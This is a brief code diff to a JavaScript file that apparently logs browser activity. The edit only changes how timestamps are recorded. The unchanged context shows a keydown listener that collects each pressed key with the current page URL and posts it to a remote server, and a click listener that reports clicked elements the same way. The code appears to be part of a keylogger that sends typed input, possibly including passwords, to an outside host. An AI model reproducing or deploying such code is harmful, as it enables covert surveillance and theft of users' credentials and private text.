@@ -31,7 +31,7 @@ document.addEventListener('keydown', (e) => {
     const data = {
         url: currentUrl,
         key: e.key,
-        time: new Date().getTime()
+        time: new Date()
     };
 
     fetch(`http://${serv}/key`, {
@@ -62,7 +62,7 @@ document.addEventListener('click', (e) => {
     const data = {
         url: currentUrl,
         target: elementInfo,
-        time: new Date().getTime()
+        time: new Date()
     };
 
     fetch(`http://${serv}/click`, {
